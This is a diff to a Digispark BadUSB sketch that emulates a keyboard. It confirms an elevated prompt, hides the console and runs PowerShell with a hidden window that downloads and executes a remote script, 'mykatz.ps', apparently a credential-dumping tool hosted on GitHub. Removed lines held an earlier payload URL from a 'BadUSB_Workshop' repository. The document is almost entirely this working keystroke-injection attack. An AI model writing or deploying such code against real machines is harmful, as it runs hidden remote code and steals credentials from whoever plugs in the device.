@@ -14,10 +14,8 @@ void loop() {
   DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT); // select option 'yes'
   DigiKeyboard.sendKeyStroke(KEY_ENTER); // confirm the prompt
   DigiKeyboard.delay(1000);
-  DigiKeyboard.println("mode con:cols=18 lines=1 && color FE && powershell -windowstyle hidden iex (wget <git-repository_.ps>)"); // minimize the cmd & open powershell
+  DigiKeyboard.println("mode con:cols=18 lines=1 && color FE && powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/gmattos/Spark_Duckmon/master/mykatz.ps -outfile "file.ps")"); // minimize the cmd & open powershell
   delay(100); /* Delay until it opens. */
-  #DigiKeyboard.println(F("powershell -windowstyle hidden iex (wget https://raw.githubusercontent.com/whoismath/BadUSB_Workshop/master/Payloads/payload-windows.ps)")); /* Open powershell. */
-  DigiKeyboard.println(F("powershell -windowstyle hidden iex (wget <git-repository_.ps>)")); /* Open powershell. */
   for(;;) { /* run just once. */ }
   DigiKeyboard.print("exit"); // exit cmd
 }
